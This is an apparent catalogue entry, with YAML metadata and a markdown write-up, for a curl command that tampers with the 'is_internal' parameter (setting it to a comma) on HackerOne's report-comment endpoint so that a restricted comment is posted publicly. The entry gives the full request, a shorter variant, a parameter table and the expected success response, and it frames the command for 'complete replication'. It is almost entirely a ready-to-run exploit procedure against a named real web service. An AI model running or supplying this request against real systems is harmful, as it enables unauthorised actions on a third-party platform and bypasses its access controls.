---
id: e5f6g7h8-i9j0-1234-efgh-567890123456
data: >-
  curl -X POST 'https://hackerone.com/reports/107329/comments' -H 'Cookie:
  your_session_cookie_here' -H 'Content-Type: application/x-www-form-urlencoded'
  -d
  'message=test&substate=&is_internal=,&reference=&add_reporter_to_original=false&reply_action=add-comment&reports_count=1&report_ids%5B%5D=107329'
tags:
  - web-exploit
  - parameter-tampering
type: command
output: >-
  {"flash":"Comment was created
  successfully.","reports":[{"latest_activity":"2015-12-29T13:35:34.210Z","id":107329,...}]}
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2024-10-04T12:00:00Z'
updated_at: '2025-12-14T17:28:58.362Z'
verified: false
validated: true
submitted: true
---
---

# curl-post-manipulated-hackerone-comment

## Command

```bash
curl -X POST 'https://hackerone.com/reports/107329/comments' \
  -H 'Cookie: your_session_cookie_here' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'message=test&substate=&is_internal=,&reference=&add_reporter_to_original=false&reply_action=add-comment&reports_count=1&report_ids%5B%5D=107329'
```

## Description

This curl command simulates a manipulated POST request to HackerOne's comment endpoint, appending a comma to 'is_internal' to bypass restrictions and post a public comment.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| URL | Target endpoint (e.g., /reports/{id}/comments) | Yes |
| `-H 'Cookie: ...'` | Session cookie for authentication | Yes |
| `-H 'Content-Type: ...'` | Sets form data encoding | Yes |
| `-d '...'` | Form data with manipulated 'is_internal=,' | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://hackerone.com/reports/107329/comments' -H 'Cookie: session=abc123' -d 'message=test&is_internal=,'
```

### Advanced Usage

Include full form data as shown in the command for complete replication.

## Expected Output

JSON response indicating successful creation: {"flash":"Comment was created successfully.","reports":[...]}, with no permission errors.

## Related

- [[Related Procedure: Submit-Manipulated-Internal-Comment]]

---
